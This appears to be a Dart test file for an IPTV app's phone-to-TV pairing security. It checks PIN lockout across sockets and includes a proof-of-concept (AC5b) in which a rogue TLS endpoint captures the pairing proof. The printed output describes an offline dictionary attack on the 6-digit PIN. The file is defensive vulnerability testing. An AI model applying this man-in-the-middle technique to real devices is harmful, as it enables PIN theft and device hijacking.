// QA SECURITY (matrix AC1 / AC2 / AC5b) — headless, protocol-level proofs.
//
// These exercise the REAL pairing code paths of TvReceiverService (receiver)
// and PhoneSenderService (sender) over an in-process wss/ws channel — the same
// code that runs on device. No emulator needed: the security properties under
// test live entirely in the pairing state machine and the proof/cert-pinning
// logic, so a loopback socket is a faithful and deterministic harness.
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:rensi_iptv/services/cast/cast_protocol.dart';
import 'package:rensi_iptv/services/cast/cast_tls.dart';
import 'package:rensi_iptv/services/cast/phone_sender_service.dart';
import 'package:rensi_iptv/services/cast/tv_receiver_service.dart';

String _redact(String b64) {
  if (b64.length <= 8) return '***';
  return '${b64.substring(0, 4)}…${b64.substring(b64.length - 4)} (len=${b64.length})';
}

void main() {
  // ── AC1 ───────────────────────────────────────────────────────────────────
  // PIN lockout per socket: 3 wrong PINs on ONE socket → the receiver closes
  // the socket at the 3rd (tv_receiver_service.dart:251). Must NOT close before.
  test('AC1 — PIN lockout closes the socket at exactly 3 wrong attempts', () async {
    final receiver = TvReceiverService(deviceName: 'TV', pin: '123456');
    final port = await receiver.start(advertise: false);

    final sender = PhoneSenderService();
    var disconnected = false;
    sender.onDisconnected = () => disconnected = true;
    await sender.connect('127.0.0.1', port); // ws:// plain (no TLS): certfp empty

    // Attempt 1
    expect(await sender.pair('000000'), isFalse, reason: 'wrong PIN #1 rejected');
    await Future<void>.delayed(const Duration(milliseconds: 120));
    expect(disconnected, isFalse, reason: 'socket still open after 1 fail');

    // Attempt 2
    expect(await sender.pair('111111'), isFalse, reason: 'wrong PIN #2 rejected');
    await Future<void>.delayed(const Duration(milliseconds: 120));
    expect(disconnected, isFalse, reason: 'socket still open after 2 fails');

    // Attempt 3 → receiver sends too_many_attempts + closes the socket.
    expect(await sender.pair('222222'), isFalse, reason: 'wrong PIN #3 rejected');
    await Future<void>.delayed(const Duration(milliseconds: 200));
    expect(disconnected, isTrue,
        reason: 'AC1: socket MUST be closed at the 3rd failed attempt');

    await sender.close();
    await receiver.stop();
    receiver.dispose();
    // ignore: avoid_print
    print('AC1 PASS: socket open after 1 & 2 fails, closed at 3rd.');
  }, timeout: const Timeout(Duration(seconds: 20)));

  // ── AC2 (FIXED) ───────────────────────────────────────────────────────────
  // Cross-socket brute-force lockout. The per-socket counter (3, AC1) never
  // stopped a brute force: the attacker reconnects and the LOCAL counter
  // resets. The fix keeps a CROSS-SOCKET failure counter on the service
  // instance, keyed by remote peer (IP): after [pinMaxAttempts] failed proofs
  // within [pinAttemptWindow], further pairing attempts from that peer are
  // rejected for a cooldown (exponential backoff). Reconnecting no longer
  // helps. We use a short cooldown so the test is deterministic and also proves
  // the lockout is a COOLDOWN, not a permanent brick.
  test('AC2 FIXED — cross-socket lockout after N failures blocks even the '
      'correct PIN, then recovers after the cooldown', () async {
    final receiver = TvReceiverService(
      deviceName: 'TV',
      pin: '424242',
      pinMaxAttempts: 5,
      // Short, deterministic cooldown for the test (production defaults to 30s
      // base / 15min cap).
      pinLockoutBase: const Duration(seconds: 2),
      pinLockoutMax: const Duration(seconds: 2),
    );
    final port = await receiver.start(advertise: false);

    // Drive 5 failed guesses across reconnects. Each socket still locks itself
    // out at 3 (AC1) and closes, so the attacker reconnects — but the failures
    // now ACCUMULATE on the service instance across sockets.
    var fails = 0;
    while (fails < 5) {
      final s = PhoneSenderService();
      var closed = false;
      s.onDisconnected = () => closed = true;
      await s.connect('127.0.0.1', port);
      while (fails < 5) {
        expect(await s.pair('000000'), isFalse, reason: 'wrong PIN rejected');
        fails++;
        await Future<void>.delayed(const Duration(milliseconds: 60));
        if (closed) break; // socket closed (per-socket 3-cap OR the lockout)
      }
      await s.close();
    }

    // LOCKOUT ENGAGED: a fresh socket with the CORRECT PIN is now rejected —
    // the whole point of the fix. Pre-fix this pairing succeeded.
    final blocked = PhoneSenderService();
    await blocked.connect('127.0.0.1', port);
    expect(await blocked.pair('424242'), isFalse,
        reason: 'AC2 FIXED: the peer is locked out, so even the correct PIN is '
            'refused during the cooldown — a brute force cannot enumerate.');
    await blocked.close();

    // RECOVERY: after the cooldown elapses, the correct PIN pairs again. Proves
    // the lockout is a transient cooldown, not a permanent brick of the device.
    await Future<void>.delayed(const Duration(milliseconds: 2500));
    final good = PhoneSenderService();
    await good.connect('127.0.0.1', port);
    expect(await good.pair('424242'), isTrue,
        reason: 'the correct PIN pairs once the cooldown expires');
    await good.close();

    await receiver.stop();
    receiver.dispose();
    // ignore: avoid_print
    print('AC2 FIXED: $fails cross-socket failures triggered a lockout that '
        'refused even the correct PIN, then recovered after the cooldown.');
  }, timeout: const Timeout(Duration(seconds: 30)));

  // ── AC5b ──────────────────────────────────────────────────────────────────
  // MITM terminator = the credential-theft vector. The sender's "anti-MITM"
  // check (phone_sender_service.dart:155) compares the captured TLS fingerprint
  // against the certfp the SERVER advertised in its own pair_challenge. An
  // attacker that terminates the wss with its OWN self-signed cert simply
  // advertises certfp = sha256(its own cert): the check passes vacuously
  // (_capturedFp == _certfp, both the attacker's), and the phone SENDS the
  // proof = HMAC(HKDF(PIN,salt), nonce‖attackerCertfp). A passive holder of
  // {salt, nonce, certfp, proof} can then offline-dictionary the 6-digit PIN.
  //
  // We stand up a rogue wss endpoint (its own cert, does NOT know the PIN),
  // point the sender at it (the debug host/port path), and CAPTURE the proof
  // the phone sends. Proving the phone emits the proof to the attacker IS the
  // vuln — we do not need to actually crack the PIN.
  test('AC5b — rogue wss terminator receives the pairing proof (offline-dictionary vector)',
      () async {
    // Attacker's OWN TLS identity (unrelated to any legit TV).
    final rogueTls = CastTls.generate();
    final rogueCertfp = base64.encode(rogueTls.fingerprint);
    final salt = base64.encode(List<int>.generate(16, (i) => i));
    final nonce = base64.encode(List<int>.generate(16, (i) => 255 - i));

    final ctx = SecurityContext(withTrustedRoots: false)
      ..useCertificateChainBytes(rogueTls.certPem.codeUnits)
      ..usePrivateKeyBytes(rogueTls.keyPem.codeUnits);
    final server =
        await HttpServer.bindSecure(InternetAddress.loopbackIPv4, 0, ctx);

    final proofReceived = Completer<Map<String, dynamic>>();
    server.listen((HttpRequest req) async {
      if (!WebSocketTransformer.isUpgradeRequest(req)) {
        req.response.statusCode = HttpStatus.forbidden;
        await req.response.close();
        return;
      }
      final ws = await WebSocketTransformer.upgrade(req);
      // The rogue TV advertises ITS OWN certfp — the whole trick.
      ws.add(encodeMsg(MsgType.pairChallenge, {
        'salt': salt,
        'nonce': nonce,
        'device': 'TotallyLegitTV',
        'tvId': 'rogue-1',
        'certfp': rogueCertfp,
      }));
      ws.listen((data) {
        final msg = decodeMsg(data as String);
        if (msg['t'] == MsgType.pairProof && !proofReceived.isCompleted) {
          proofReceived.complete(msg);
        }
      });
    });

    // Victim phone connects to the attacker (as it would via debug-connect or a
    // spoofed mDNS record) and tries to pair with its real PIN.
    final phone = PhoneSenderService();
    await phone.connect('127.0.0.1', server.port, secure: true);
    final pairFut = phone.pair('654321'); // the phone's real 6-digit PIN

    // THE ASSERTION: the phone did NOT abort — it sent the proof to the rogue.
    final captured = await proofReceived.future
        .timeout(const Duration(seconds: 5), onTimeout: () => {});
    expect(captured['t'], MsgType.pairProof,
        reason: 'AC5b CONFIRMED-VULN: phone sent the pairing proof to a rogue '
            'cert-terminating endpoint (the anti-MITM check is self-asserted).');
    final capturedProof = captured['proof'] as String;
    expect(capturedProof, isNotNull);

    // ignore: avoid_print
    print('AC5b CONFIRMED-VULN — attacker captured, over the wire, everything '
        'needed for an offline 6-digit-PIN dictionary attack:');
    // ignore: avoid_print
    print('   salt      = ${_redact(salt)}');
    // ignore: avoid_print
    print('   nonce     = ${_redact(nonce)}');
    // ignore: avoid_print
    print('   certfp    = ${_redact(rogueCertfp)}  (attacker-controlled)');
    // ignore: avoid_print
    print('   PROOF     = ${_redact(capturedProof)}  = HMAC(HKDF(PIN,salt), nonce‖certfp)');
    // ignore: avoid_print
    print('   => for pin in 000000..999999: HMAC matches => PIN recovered offline.');

    // Let the pair() future settle (rogue never sends pair_result → times out).
    await pairFut.timeout(const Duration(seconds: 6), onTimeout: () => false);
    await phone.close();
    await server.close(force: true);
  }, timeout: const Timeout(Duration(seconds: 25)));
}
